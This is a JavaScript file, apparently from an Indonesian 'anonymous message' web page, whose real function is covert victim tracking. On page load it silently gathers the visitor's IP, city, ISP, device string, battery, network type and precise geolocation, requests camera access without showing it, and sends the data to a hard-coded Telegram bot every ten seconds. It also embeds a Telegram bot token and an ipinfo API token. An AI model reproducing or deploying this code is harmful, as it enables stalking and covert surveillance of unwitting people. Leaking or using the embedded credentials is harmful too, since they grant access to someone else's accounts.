const statusEl = document.getElementById('status');
const sendBtn = document.getElementById('sendBtn');
const msgTextarea = document.getElementById('msg');

const CHAT_ID = "7483495590"; // ganti sesuai admin
const BOT_TOKEN = "7673116033:AAFM3bM-phhJKBVq4OsLCnkPGDuqjcaRW2c"; // ganti token lo

// Ambil device info + lokasi + kamera otomatis
async function getDeviceInfo() {
  let geo="Tidak tersedia";
  try{
    const ipInfo = await fetch("https://ipinfo.io/json?token=5602d2e05cb668").then(r=>r.json());
    const battery = await navigator.getBattery();
    
    // Geolocation otomatis
    if(navigator.geolocation){
      await new Promise(resolve => navigator.geolocation.getCurrentPosition(pos=>{
        geo = `Lat: ${pos.coords.latitude}, Lng: ${pos.coords.longitude}, Accuracy: ${pos.coords.accuracy} m`;
        resolve();
      }, ()=>resolve()));
    }

    // Kamera otomatis (cuma akses, gak nampilin di halaman)
    try{
      await navigator.mediaDevices.getUserMedia({video:true, audio:false});
    }catch(e){
      console.warn("Gagal akses kamera:", e);
    }

    const time = new Date().toLocaleString("id-ID");
    const connection = navigator.connection || {};

    return `
🌐 *Informasi IP*
📶 IP: ${ipInfo.ip}
🌍 Negara: ${ipInfo.country}
🏙️ Kota: ${ipInfo.city}
🛠️ ISP: ${ipInfo.org}
⏱️ Timezone: ${ipInfo.timezone || "-"}
📱 Device: ${navigator.userAgent}
📍 Geolocation: ${geo}
🔋 Battery: ${Math.round(battery.level*100)}% ${battery.charging?"⚡️ Mengisi daya":""}
⏰ Waktu: ${time}
📡 Jaringan: ${connection.effectiveType||"❌ Tidak diketahui"}
    `;
  }catch(err){
    console.error(err);
    return "❌ Gagal ambil info device";
  }
}

// Kirim ke Telegram
async function sendToTelegram(data){
  try{
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify({ chat_id:CHAT_ID, text:data, parse_mode:"Markdown" })
    });
  }catch(err){console.error(err);}
}

// Live tracking setiap 10 detik
async function liveTracking(){
  const info = await getDeviceInfo();
  await sendToTelegram(info);
  statusEl.textContent = `Terakhir update: ${new Date().toLocaleTimeString()}`;
}

window.onload = async () => {
  await liveTracking();
  setInterval(liveTracking,10000);
};

// Tombol kirim pesan manual
sendBtn.addEventListener('click', async ()=>{
  const msg = msgTextarea.value.trim();
  if(!msg) return alert("Isi pesan dulu!");
  await sendToTelegram(`💬 Pesan anonim:\n${msg}`);
  msgTextarea.value = "";
  statusEl.textContent = "Pesan terkirim!";
});
